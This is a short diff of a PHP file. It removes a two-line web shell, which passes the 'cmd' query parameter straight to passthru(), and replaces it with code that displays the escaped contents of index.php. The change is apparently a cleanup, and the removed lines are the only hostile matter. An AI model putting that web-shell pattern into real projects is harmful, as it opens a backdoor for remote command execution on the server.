@@ -1,4 +1,10 @@
 <?php
-$cmd = $_GET['cmd'] ?? '';
-passthru($cmd);
+$file = 'index.php';
+
+if (file_exists($file)) {
+    echo "Contents of '$file':<br>";
+    echo nl2br(htmlspecialchars(file_get_contents($file)));
+} else {
+    echo "'$file' does not exist.";
+}
 ?>
